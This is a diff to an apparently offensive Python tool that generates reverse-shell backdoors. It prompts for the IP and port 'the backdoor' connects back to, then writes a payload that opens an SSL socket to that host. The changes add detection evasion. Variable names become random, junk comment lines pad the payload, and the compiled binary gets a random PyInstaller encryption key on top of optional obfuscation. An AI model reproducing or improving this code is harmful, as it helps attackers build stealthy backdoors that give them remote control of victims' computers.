@@ -3,10 +3,13 @@ import socket
 import shutil
 import platform
 from urllib import response
-import requests
+import secrets
+import string
 import random
 from pickle import GLOBAL
 bind=0
+c=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(9)))
+d=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(9)))
 reps=False
 def logo():
     logo1 = """
@@ -238,11 +241,9 @@ def gen_rev_ssl_tcp():
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
-        import secrets
-        import string
-        ina.write('port = '+str(port)+'\n')
+        ina.write(d+' = '+port)
         ina.write("\n")
-        ina.write('hototo = "'+str(host)+'"'+'\n')
+        ina.write(c+' = "'+host+'"'+'\n')
         for i in range(50):
             a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(50)))
             ina.write('#'+a+'\n')
@@ -250,11 +251,10 @@ def gen_rev_ssl_tcp():
 
 import zlib,base64,ssl,socket,struct,time
 
-
 for x in range(10):
 	try:
 		so=socket.socket(2,1)
-		so.connect((hototo,port))
+		so.connect(('''+c+''','''+d+'''))
 		s=ssl.wrap_socket(so)
 		break
 	except:
@@ -374,6 +374,7 @@ def postgen():
     opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
     global encrypted
     encrypted = False
+    b=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase)for i in range(13)))
     if opt_obf == 'y':
         encrypted = True
         import obfuscator
@@ -381,11 +382,11 @@ def postgen():
     compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
     if compiling == 'y':
         if encrypted == True:
-            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
+            compcomd = 'pyinstaller --key '+b+' -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
             os.system(compcomd)
             print('Saved under "dist" folder')
         else:
-            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
+            compcomd = 'pyinstaller --key '+b+' -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
             os.system(compcomd)
             os.system(clear)
             print(logo)
